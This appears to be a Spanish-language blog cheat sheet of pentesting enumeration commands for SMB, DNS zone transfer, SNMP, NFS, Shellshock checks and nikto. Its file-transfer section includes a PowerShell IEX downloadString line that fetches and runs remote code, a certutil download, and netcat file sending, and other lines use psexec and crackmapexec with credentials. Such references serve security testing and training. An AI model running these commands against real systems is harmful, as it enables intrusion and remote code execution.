---
layout: post
title: Enumeración - CheetSheat
tags: [CheetSheat]
description: "Enumeración - CheetSheat"
---

## Samba Port 445

### Iniciar samba

```
sudo service smbd start
```

### smbget

```
smbget -R smb://<share>/
```

### smbmap

```
smbmap -H <ip> -r /share/share2
smbmap -H <ip> --download /share/share2/file
smbmap -H <ip> -d <domain> -u <user> -p <password>
```

### smbclient

```
smbclient //<ip>/share -U <domain>\\<user>%<password>
smbclient -NL //<ip>
```

### psexec

```
psexec.py <domain>/<user>@<ip>
```

### CracMapExec

```
crackmapexec smb <ip>  -u <user> -p <password>
```

### Montura

```
mount -t cifs //<ip>/<share> <folder_attack> -o username=<user>,password=<password>,rw
umount <folder>
```

### Scripts nmap

```
nmap --script "vuln and safe" -p445 <ip>
nmap --script=smb-enum-shares,smb-enum-users -p445 <ip>
```

----

## DNS 53

| argumento | descripción                     |
|-----------|---------------------------------|
| ns        | nombres de servicio             |
| mx        | servidores de correo            |
| axfr      | ataque de transferencia de zona |

```
dig @<ip> <domain>
dig @<ip> <domain> ns
dig @<ip> <domain> mx
```

### Ataque de transferencia de zona

```
dig @<ip> <domain> axfr
```

----

## HTTPS 443

```
openssl s_client --connect <ip>:<port>
```

## SNMP UDP 161

### Script de nmap

```
nmap --script snmp\* -p161 -sU <ip> -oN <output>
```

----

## NFS 2049

Es un sistema cliente / servidor que permite a los usuarios acceder a archivos a través de una red y tratarlos como si residieran en un directorio de archivos local.

### Carpeta desponible

```
showmount -e <ip>
```

### Montar carpeta

```
sudo mount -t nfs <ip>:<remote_folder> <local_folder>
```

----

## Transferencia de archivos

### Linux

```
nc -lvp <port> > file (recibe el fichero)
nc <ip> < <file> <port> (envia el fichero)
```

```
wget <url> -O <output>
```

```
impacket-smbserver share $(pwd) -smb2support
```

```
python3 -m http.server <port>
python -m SimpleHTTPServer <port>
```

```
sudo python -m pyftpdlip -p 21 -w
```

### Windows

```
certutil.exe -f -urlcache -split <url>
```

```
powershell IEX(New-Object Net.WebClient).downloadString('<url>')"
```

----

## Diccionarios

### Extensiones

```
> for i in $(locate extension | grep "word");do echo $(wc -l $i); done
/usr/share/wordlists/SecLists/Discovery/Web-Content/web-extensions.txt
```

### CGI

```
/usr/share/wordlist/SecLists/Discovery/Web-Content/CGIs.txt
```

----

### Shellshock

```
ls -lah /usr/share/nmap/scripts/*shellshock*
nmap <ip> -p <port> --script=http-shellshock --script-args uri=/cgi-bin/<file>.cgi --script-args uri=/cgi-bin/<file2>.cgi
```

----

## Nikto

```
nikto -host <ip>
```
